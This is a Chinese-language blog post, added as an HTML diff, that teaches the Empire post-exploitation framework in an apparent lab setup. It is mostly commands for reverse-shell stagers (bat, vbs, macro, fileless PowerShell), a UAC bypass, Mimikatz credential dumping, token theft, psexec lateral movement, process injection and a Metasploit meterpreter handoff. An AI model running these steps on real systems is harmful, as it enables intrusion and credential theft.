@@ -1,0 +1,757 @@
+<!DOCTYPE html>
+
+
+<html lang="zh-CN">
+
+
+<head>
+  <meta charset="utf-8" />
+    
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+  <title>
+    Empire工具基础用法 |  Time
+  </title>
+  <meta name="generator" content="hexo-theme-ayer">
+  
+  <link rel="shortcut icon" href="/favicon.ico" />
+  
+  
+<link rel="stylesheet" href="/dist/main.css">
+
+  
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/Shen-Yu/cdn/css/remixicon.min.css">
+
+  
+<link rel="stylesheet" href="/css/custom.css">
+
+  
+  
+<script src="https://cdn.jsdelivr.net/npm/pace-js@1.0.2/pace.min.js"></script>
+
+  
+  
+
+  
+
+</head>
+
+</html>
+
+<body>
+  
+  <div id="app">
+    <main class="content on">
+      <section class="outer">
+  <article id="post-Empire工具基础用法" class="article article-type-post" itemscope
+  itemprop="blogPost" data-scroll-reveal>
+
+  <div class="article-inner">
+    
+    <header class="article-header">
+       
+<h1 class="article-title sea-center" style="border-left:0" itemprop="name">
+  Empire工具基础用法
+</h1>
+ 
+
+    </header>
+    
+
+    
+    <div class="article-meta">
+      <a href="/2020/06/03/Empire%E5%B7%A5%E5%85%B7%E5%9F%BA%E7%A1%80%E7%94%A8%E6%B3%95/" class="article-date">
+  <time datetime="2020-06-02T16:54:14.000Z" itemprop="datePublished">2020-06-03</time>
+</a>
+      
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/">内网渗透</a>
+  </div>
+
+      
+      
+<div class="word_count">
+    <span class="post-time">
+        <span class="post-meta-item-icon">
+            <i class="ri-quill-pen-line"></i>
+            <span class="post-meta-item-text"> 字数统计:</span>
+            <span class="post-count">1.5k</span>
+        </span>
+    </span>
+
+    <span class="post-time">
+        &nbsp; | &nbsp;
+        <span class="post-meta-item-icon">
+            <i class="ri-book-open-line"></i>
+            <span class="post-meta-item-text"> 阅读时长≈</span>
+            <span class="post-count">6 分钟</span>
+        </span>
+    </span>
+</div>
+
+      
+    </div>
+    
+
+    
+    
+    <div class="tocbot"></div>
+
+
+
+
+
+    
+
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+      
+
+      
+      <p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1gfeflnjm2wj31900u0npe.jpg" alt="88"></p>
+<a id="more"></a>
+
+<h3 id="0x00-介绍"><a href="#0x00-介绍" class="headerlink" title="0x00 介绍"></a>0x00 介绍</h3><p>​        Empire 是一款类似Metasploit 的渗透测试框架，基于python 编写，Empire是一个纯粹的PowerShell 后开发代理，建立在密码安全通信和灵活的架构上。Empire 实现了无需powershell.exe 即可运行PowerShell 代理的功能，从键盘记录器到Mimikatz 等快速部署的后期开发模块，以及适应性通信以避开网络检测，所有这些都包含在以可用性为重点的框架中。</p>
+<h3 id="0x01-安装"><a href="#0x01-安装" class="headerlink" title="0x01 安装"></a>0x01 安装</h3><p>下载地址： <a href="https://github.com/EmpireProject/Empire" target="_blank" rel="noopener">https://github.com/EmpireProject/Empire</a></p>
+<p>下载地址：<a href="https://github.com/interference-security/empire-web.git" target="_blank" rel="noopener">https://github.com/interference-security/empire-web.git</a>  (web版)</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">下载</span><br><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;EmpireProject&#x2F;Empire.git</span><br><span class="line"></span><br><span class="line">切换至工具目录setup下</span><br><span class="line">	.&#x2F;install.sh</span><br><span class="line">出现setip comlete则安装成功</span><br><span class="line">	.&#x2F;reset.sh</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://tva1.sinaimg.cn/large/0082zybpgy1gbrhi9oq0tj316c0rkwn9.jpg" alt="image-20200210180914768"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">切换至主目录运行.&#x2F;empire，如果出现错误则使用pip安装模块即可</span><br><span class="line"></span><br><span class="line">若出现无pydispatcher模块名，则使用以下命令解决即可</span><br><span class="line">	pip install PyDispatcher</span><br><span class="line">	</span><br><span class="line">若出现No module named Crypto.Cipher</span><br><span class="line">	pip install pycrypto</span><br></pre></td></tr></table></figure>
+
+<p>成功界面！</p>
+<p><img src="https://tva1.sinaimg.cn/large/0082zybpgy1gbrhia8gi2j316u0oigpg.jpg" alt="image-20200210183146543"></p>
+<h3 id="0x02-监听模块"><a href="#0x02-监听模块" class="headerlink" title="0x02 监听模块"></a>0x02 监听模块</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">进入监听模块</span><br><span class="line">	listeners</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://tva1.sinaimg.cn/large/0082zybpgy1gc97izbyoej31hg0mggtx.jpg" alt="image-20200225133238490"></p>
+<p>参数</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">agents	</span><br><span class="line">	跳转到代理菜单</span><br><span class="line">back	</span><br><span class="line">	回到主菜单</span><br><span class="line">creds	</span><br><span class="line">	显示&#x2F;返回数据库中的凭据</span><br><span class="line">delete	</span><br><span class="line">	从数据库中删除侦听器</span><br><span class="line">disable	</span><br><span class="line">	禁用禁用（停止）一个或所有侦听器。侦听器不会自动启动Empire</span><br><span class="line">edit	</span><br><span class="line">	编辑更改侦听器选项，在重新启动侦听器之前不会生效</span><br><span class="line">enable	</span><br><span class="line">	启用并启动一个或所有侦听器</span><br><span class="line">exit	</span><br><span class="line">	退出</span><br><span class="line">help	</span><br><span class="line">	显示帮助菜单</span><br><span class="line">info	</span><br><span class="line">	显示活动侦听器的信息</span><br><span class="line">kill	</span><br><span class="line">	杀死一个或所有活跃的听众</span><br><span class="line">launcher	</span><br><span class="line">	为侦听器生成初始启动器</span><br><span class="line">list	</span><br><span class="line">	列出所有活动的侦听器（或代理）</span><br><span class="line">listeners	</span><br><span class="line">	跳转到“侦听器”菜单</span><br><span class="line">main	</span><br><span class="line">	主菜单返回主菜单</span><br><span class="line">resource	</span><br><span class="line">	从文件中读取并执行帝国命令列表</span><br><span class="line">uselistener	</span><br><span class="line">	使用帝国侦听器模块</span><br><span class="line">usestager	</span><br><span class="line">	使用帝国雄鹿</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<p>监听方法</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">监听方法</span><br><span class="line">	http</span><br><span class="line">	https</span><br><span class="line">	</span><br><span class="line">修改监听名</span><br><span class="line">	set Name Time</span><br><span class="line"></span><br><span class="line">设置shell回弹地址</span><br><span class="line">	set Host http:&#x2F;&#x2F;192.168.43.239:8080</span><br><span class="line"></span><br><span class="line">设置监听端口</span><br><span class="line">	set Port 8080</span><br><span class="line"></span><br><span class="line">开启监听</span><br><span class="line">	execute</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://tva1.sinaimg.cn/large/0082zybpgy1gc97j8vgwej315w0u04j7.jpg" alt="image-20200225135923882"></p>
+<p><img src="https://tva1.sinaimg.cn/large/0082zybpgy1gc97ixs46qj32ni060q7l.jpg" alt="image-20200225140922490"></p>
+<h3 id="0x03-生成payload模块"><a href="#0x03-生成payload模块" class="headerlink" title="0x03 生成payload模块"></a>0x03 生成payload模块</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">返回主菜单，输入usestager （空格+tab）可显示当前能生成的payload</span><br><span class="line">根据目标系统选择对应payload</span><br><span class="line">本次目标系统为windows7</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://tva1.sinaimg.cn/large/0082zybpgy1gc97iwk1maj32ni060q7l.jpg" alt="image-20200225142334385"></p>
+<p>选择windows/launcher_bat模块</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">usestager windows&#x2F;launcher_bat Time(监听器名称)</span><br><span class="line">生成</span><br><span class="line">	execute</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://tva1.sinaimg.cn/large/0082zybpgy1gc97ixa7tqj317l0u04bi.jpg" alt="image-20200225143122716"></p>
+<p><img src="https://tva1.sinaimg.cn/large/0082zybpgy1gc97j4h2cnj32xs0mae81.jpg" alt="image-20200225143504171"></p>
+<p>接收反弹成功</p>
+<p><img src="https://tva1.sinaimg.cn/large/0082zybpgy1gc97j6abfgj30zy04a75k.jpg" alt="image-20200225145039349"></p>
+<p><img src="https://tva1.sinaimg.cn/large/0082zybpgy1gc97j08jpuj31lw07cac1.jpg" alt="image-20200225145058252"></p>
+<p>选择会话</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">interact 2RH69CMK</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://tva1.sinaimg.cn/large/0082zybpgy1gc97j4w4rwj31mi0fcn14.jpg" alt="image-20200225145810389"></p>
+<p>选择windows/launcher_vbs模块</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">usestager windows&#x2F;launcher_vbs Time(监听器名称)</span><br><span class="line">生成</span><br><span class="line">	execute</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://tva1.sinaimg.cn/large/0082zybpgy1gc97j216soj32yi0o8kjl.jpg" alt="image-20200225160206353"></p>
+<p>获取shell成功</p>
+<p><img src="https://tva1.sinaimg.cn/large/0082zybpgy1gc97j6qqd8j31pu0dw79b.jpg" alt="image-20200225160405629"></p>
+<p>另外一种直接生成shell方法</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">windows</span><br><span class="line">	launcher powershell Time</span><br><span class="line">在目标主机中直接运行，无文件落地，隐秘性较高</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://tva1.sinaimg.cn/large/0082zybpgy1gc97j5q6dfj32ya0l8hdt.jpg" alt="image-20200225160843514"></p>
+<p>反弹成功</p>
+<p><img src="https://tva1.sinaimg.cn/large/0082zybpgy1gc97j78rmmj32280fmn53.jpg" alt="image-20200225160955148"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">linux</span><br><span class="line">	launcher python Time</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://tva1.sinaimg.cn/large/0082zybpgy1gc97j80fvlj32y40p4axv.jpg" alt="image-20200225162205082"></p>
+<p><img src="https://tva1.sinaimg.cn/large/0082zybpgy1gc97izugoej30vb0u0ncp.jpg" alt="image-20200225162330487"></p>
+<p>宏反弹shell</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">usestager windows&#x2F;macro Time(监听器名称)</span><br><span class="line">生成</span><br><span class="line">	execute</span><br><span class="line">	</span><br><span class="line">将代码复制到execl的宏代码中运行</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://tva1.sinaimg.cn/large/0082zybpgy1gc97iymvyzj31340u0x1h.jpg" alt="image-20200225171313456"></p>
+<p>反弹成功</p>
+<p><img src="https://tva1.sinaimg.cn/large/0082zybpgy1gc97ja1i8sj313k0u0tqq.jpg" alt="image-20200225170131670"></p>
+<h3 id="0x04-代理会话-shell会话"><a href="#0x04-代理会话-shell会话" class="headerlink" title="0x04 代理会话(shell会话)"></a>0x04 代理会话(shell会话)</h3><p>参数</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">agents	</span><br><span class="line">	跳转到代理菜单。</span><br><span class="line">autorun	</span><br><span class="line">	从文件读取并执行帝国命令列表，并在每个新代理上执行“autorun&lt;resource file&gt;&lt;agent language&gt;”，例如“autorun&#x2F;root&#x2F;ps.rc powershell”。或使用“自动运行清除”清除任何自动运行设置，并使用“自动运行显示”显示当前自动运行设置</span><br><span class="line">	</span><br><span class="line">back	</span><br><span class="line">	回到主菜单。</span><br><span class="line">clear	</span><br><span class="line">	清除一个或多个代理的任务。</span><br><span class="line">creds	</span><br><span class="line">	显示&#x2F;返回数据库中的凭据。</span><br><span class="line">exit	</span><br><span class="line">	退出。</span><br><span class="line">help	</span><br><span class="line">	显示帮助菜单。</span><br><span class="line">interact	</span><br><span class="line">	与特定代理交互。</span><br><span class="line">kill	</span><br><span class="line">	杀死一个或多个代理以退出任务。</span><br><span class="line">killdate	</span><br><span class="line">	设置一个或多个代理的kildate（kildate[agent&#x2F;all]01&#x2F;01&#x2F;2016）。</span><br><span class="line">list	</span><br><span class="line">	列表列出所有活动代理（或侦听器）。</span><br><span class="line">listeners	</span><br><span class="line">	跳转到“侦听器”菜单。</span><br><span class="line">lostlimit	</span><br><span class="line">	Task将一个或多个代理设置为“lostlimit[代理&#x2F;全部][错过的回调数]”</span><br><span class="line">main	</span><br><span class="line">	主菜单返回主菜单。</span><br><span class="line">remove	</span><br><span class="line">	从数据库中删除一个或多个代理。</span><br><span class="line">rename	</span><br><span class="line">	重命名重命名特定代理。</span><br><span class="line">resource	</span><br><span class="line">	从文件中读取并执行帝国命令列表。</span><br><span class="line">searchmodule	</span><br><span class="line">	搜索帝国模块名称&#x2F;描述。</span><br><span class="line">sleep	</span><br><span class="line">	睡眠任务一个或多个代理“睡眠[代理&#x2F;全部]间隔[抖动]”</span><br><span class="line">usemodule	</span><br><span class="line">	使用帝国PowerShell模块。</span><br><span class="line">usestager	</span><br><span class="line">	使用帝国雄鹿。</span><br><span class="line">workinghou	</span><br><span class="line">	工作时间设置一个或多个代理的工作时间（工作时间[代理&#x2F;全部]9:00-17:00）。</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">list</span><br><span class="line">	查看会话列表</span><br><span class="line">用户处*代表最高权限</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://tva1.sinaimg.cn/large/00831rSTly1gcbz16kwvxj31l605640n.jpg" alt="image-20200227000538125"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">list stale</span><br><span class="line">	列出已丢失会话代理</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://tva1.sinaimg.cn/large/0082zybpgy1gc97p7igqyj31ne07sad4.jpg" alt="image-20200226023048893"></p>
+<h3 id="0x05-UAC提权方法模块"><a href="#0x05-UAC提权方法模块" class="headerlink" title="0x05 UAC提权方法模块"></a>0x05 UAC提权方法模块</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">进入会话，输入usemodule (空格+tab键)查看可使用模块</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://tva1.sinaimg.cn/large/0082zybpgy1gc97p94hgcj31jn0u0npd.jpg" alt="image-20200226023120588"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">usemodule privesc&#x2F;powerup&#x2F;allchecks</span><br><span class="line">	检测提权方法模块</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://tva1.sinaimg.cn/large/00831rSTly1gcbzounsfrj30lw0cywf0.jpg" alt="image-20200228121225322"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">UAC提权模块</span><br><span class="line">	bypassuac Time</span><br></pre></td></tr></table></figure>
+
+<p>提权成功</p>
+<p><img src="https://tva1.sinaimg.cn/large/0082zybpgy1gc97pb253fj31pw0r2qe6.jpg" alt="image-20200226023221559"></p>
+<h3 id="0x06-信息收集"><a href="#0x06-信息收集" class="headerlink" title="0x06 信息收集"></a>0x06 信息收集</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ps</span><br><span class="line">	查看进程</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://tva1.sinaimg.cn/large/0082zybpgy1gc97pa31sdj30u00xodpf.jpg" alt="image-20200226023252724"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">本地管理组访问模块</span><br><span class="line">	usemodule situational_awareness&#x2F;network&#x2F;powerview&#x2F;find_localadmin_access</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://tva1.sinaimg.cn/large/0082zybpgy1gc988sof8gj31820iq79c.jpg" alt="image-20200226023409814"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">加载mimikatz获取管理员hash</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://tva1.sinaimg.cn/large/0082zybpgy1gc988ryzutj313g0u0nde.jpg" alt="image-20200226023812869"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">查看用户及hash(包括明文)</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://tva1.sinaimg.cn/large/0082zybpgy1gc988t6i2nj31fk096n00.jpg" alt="image-20200226023858797"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">creds krbtgt </span><br><span class="line"> 	搜索特定用户的krbtgt</span><br><span class="line">creds plaintext </span><br><span class="line"> 	搜索hash中的明文</span><br><span class="line">creds hash </span><br><span class="line">	列出所有hash值</span><br><span class="line">creds export &#x2F;opt&#x2F;hash.csv </span><br><span class="line">	导出hash凭证到指定的格式</span><br><span class="line">	</span><br><span class="line">shell net localgroup administrators </span><br><span class="line">	查看管理员组</span><br><span class="line">shell ipconfig </span><br><span class="line">	查看IP地址</span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">用户账号枚举模块</span><br><span class="line">	usemodule situational_awareness&#x2F;network&#x2F;powerview&#x2F;get_user</span><br><span class="line">可设置域名</span><br><span class="line">  set Domain hacker.testlab</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://tva1.sinaimg.cn/large/0082zybpgy1gc988tth2yj30y80u0h41.jpg" alt="image-20200226024938492"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">网络用户会话登录情况</span><br><span class="line">	usemodule situational_awareness&#x2F;network&#x2F;powerview&#x2F;userhunter</span><br><span class="line">	</span><br><span class="line">网络扫描</span><br><span class="line">	shell ping -a -n 1 192.168.2.1</span><br><span class="line">	usemodule situational_awareness&#x2F;network&#x2F;arpscan</span><br><span class="line">设置扫描范围</span><br><span class="line">	set Range 192.168.2.1-192.168.2.150</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://tva1.sinaimg.cn/large/00831rSTly1gcbz15m391j30vi0u0akv.jpg" alt="image-20200226141750252"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">DNS信息获取</span><br><span class="line">	usemodule situational_awareness&#x2F;network&#x2F;reverse_dns</span><br><span class="line"></span><br><span class="line">共享文件</span><br><span class="line">	usemodule situational_awareness&#x2F;network&#x2F;powerview&#x2F;share_finder</span><br><span class="line">	set CheckShareAccess True</span><br><span class="line">	</span><br><span class="line">会话令牌偷取获取目标访问权限</span><br><span class="line">	ps cmd</span><br><span class="line">	steal_token  3716(PID)</span><br><span class="line">	shell dir \\HACKER(域名称)\c$</span><br><span class="line">	</span><br><span class="line">psexec模块横向生成一个反弹代理</span><br><span class="line">	usemodule lateral_movement&#x2F;invoke_psexec</span><br><span class="line">	设置监听器名称</span><br><span class="line">	set Listener Time</span><br><span class="line">	设置域名称</span><br><span class="line">	set ComputerName HACKER</span><br><span class="line">	</span><br><span class="line">会话注入得到反弹代理</span><br><span class="line">	ps cmd</span><br><span class="line">	选择反弹模块</span><br><span class="line">	usemodule management&#x2F;psinject</span><br><span class="line">	设置PID</span><br><span class="line">	set ProcId 2340</span><br><span class="line">	设置监听器名称</span><br><span class="line">	set Listener Time</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://tva1.sinaimg.cn/large/00831rSTly1gcbz13b8lkj316j0u0tl7.jpg" alt="image-20200226201934966"></p>
+<h3 id="0x07-Empire和MSF联动"><a href="#0x07-Empire和MSF联动" class="headerlink" title="0x07 Empire和MSF联动"></a>0x07 Empire和MSF联动</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Empire</span><br><span class="line">		usemodule code_execution&#x2F;invoke_shellcode</span><br><span class="line">		info</span><br><span class="line">		set Lhost 192.168.2.131</span><br><span class="line">		set Lport 4445</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Metasploit</span><br><span class="line">		use exploit&#x2F;multi&#x2F;handler</span><br><span class="line">		set payload windows&#x2F;meterpreter&#x2F;reverse_https</span><br><span class="line">		set lhost 192.168.2.131</span><br><span class="line">    set lport 4445</span><br><span class="line">    set exitsession false</span><br><span class="line">    exploit -j</span><br></pre></td></tr></table></figure>
+
+
+      
+      <!-- reward -->
+      
+    </div>
+    
+    
+      <!-- copyright -->
+      
+        <div class="declare">
+          <ul class="post-copyright">
+            <li>
+              <i class="ri-copyright-line"></i>
+              <strong>版权声明： </strong>
+              本博客所有文章除特别声明外，著作权归作者所有。转载请注明出处！
+            </li>
+          </ul>
+        </div>
+        
+    <footer class="article-footer">
+      
+          
+<div class="share-btn">
+      <span class="share-sns share-outer">
+        <i class="ri-share-forward-line"></i>
+        分享
+      </span>
+      <div class="share-wrap">
+        <i class="arrow"></i>
+        <div class="share-icons">
+          
+          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
+            <i class="ri-weibo-fill"></i>
+          </a>
+          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
+            <i class="ri-wechat-fill"></i>
+          </a>
+          <a class="qq share-sns" href="javascript:;" data-type="qq">
+            <i class="ri-qq-fill"></i>
+          </a>
+          <a class="douban share-sns" href="javascript:;" data-type="douban">
+            <i class="ri-douban-line"></i>
+          </a>
+          <!-- <a class="qzone share-sns" href="javascript:;" data-type="qzone">
+            <i class="icon icon-qzone"></i>
+          </a> -->
+          
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
+            <i class="ri-facebook-circle-fill"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
+            <i class="ri-twitter-fill"></i>
+          </a>
+          <a class="google share-sns" href="javascript:;" data-type="google">
+            <i class="ri-google-fill"></i>
+          </a>
+        </div>
+      </div>
+</div>
+
+<div class="wx-share-modal">
+    <a class="modal-close" href="javascript:;"><i class="ri-close-circle-line"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <div class="wx-qrcode">
+      <img src="//api.qrserver.com/v1/create-qr-code/?size=150x150&data=https://timeshu.github.io/2020/06/03/Empire%E5%B7%A5%E5%85%B7%E5%9F%BA%E7%A1%80%E7%94%A8%E6%B3%95/" alt="微信分享二维码">
+    </div>
+</div>
+
+<div id="share-mask"></div>
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%90%8E%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7/" rel="tag">后渗透工具</a></li></ul>
+
+
+    </footer>
+
+  </div>
+
+  
+  
+  <nav class="article-nav">
+    
+      <a href="/2020/06/03/powershell%E6%94%B6%E9%9B%86%E5%9F%9F%E4%BF%A1%E6%81%AF/" class="article-nav-link">
+        <strong class="article-nav-caption">上一篇</strong>
+        <div class="article-nav-title">
+          
+            powershell收集域信息
+          
+        </div>
+      </a>
+    
+    
+      <a href="/2020/06/03/%E5%9F%9F%E5%86%85%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/" class="article-nav-link">
+        <strong class="article-nav-caption">下一篇</strong>
+        <div class="article-nav-title">域内信息收集</div>
+      </a>
+    
+  </nav>
+
+
+  
+
+  
+  
+<!-- valine评论 -->
+<div id="vcomments-box">
+    <div id="vcomments">
+    </div>
+</div>
+<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+<script src='https://cdn.jsdelivr.net/npm/valine@1.3.10/dist/Valine.min.js'></script>
+<script>
+    new Valine({
+        el: '#vcomments',
+        app_id: '',
+        app_key: '',
+        path: window.location.pathname,
+        notify: false,
+        verify: false,
+        avatar: 'monsterid',
+        placeholder: '给我的文章加点评论吧~',
+        recordIP: true
+    });
+    const infoEle = document.querySelector('#vcomments .info');
+    if (infoEle && infoEle.childNodes && infoEle.childNodes.length > 0) {
+        infoEle.childNodes.forEach(function (item) {
+            item.parentNode.removeChild(item);
+        });
+    }
+</script>
+<style>
+    #vcomments-box {
+        padding: 5px 30px;
+    }
+
+    @media screen and (max-width: 800px) {
+        #vcomments-box {
+            padding: 5px 0px;
+        }
+    }
+
+    #vcomments-box #vcomments {
+        background-color: #fff;
+    }
+
+    .v .vlist .vcard .vh {
+        padding-right: 20px;
+    }
+
+    .v .vlist .vcard {
+        padding-left: 10px;
+    }
+</style>
+
+  
+
+  
+  
+  
+  
+  
+
+</article>
+</section>
+      <footer class="footer">
+  <div class="outer">
+    <ul>
+      <li>
+        Copyrights &copy;
+        2015-2020
